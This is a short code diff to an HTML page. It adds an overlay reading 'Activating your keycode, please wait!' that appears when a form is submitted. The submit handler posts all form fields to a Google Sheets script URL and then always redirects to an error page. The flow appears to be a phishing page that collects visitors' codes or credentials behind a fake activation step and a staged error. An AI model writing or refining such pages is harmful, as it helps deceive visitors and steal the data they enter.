@@ -62,7 +62,12 @@ s0.parentNode.insertBefore(s1,s0);
 <body >
 
     <!-- Preloader -->
-  
+  <div style="position: fixed; width: 100%; height: 100%; z-index: 99999; background-color: rgba(0, 0, 0, 0.5); display: none; justify-content: center; align-items: center;" id="preloader" >
+        <div style="display: flex; flex-direction: column; align-items: center;" class="loading_content" >
+            <img id="loading_img" height="50" width="50" src="/assets/img/loading.png" />
+            <h4 style="color: white;" >Activating your keycode, please wait!</h4>
+        </div>
+    </div>
 
 
     <div class="main-container" >
@@ -218,7 +223,8 @@ s0.parentNode.insertBefore(s1,s0);
             const form = document.forms['google-sheet']
           
             form.addEventListener('submit', e => {
-              e.preventDefault()
+              e.preventDefault();
+	      document.getElementById("preloader").style.display = "flex";
               fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                 .then(response => window.open('/error.html', '_self'))
             })
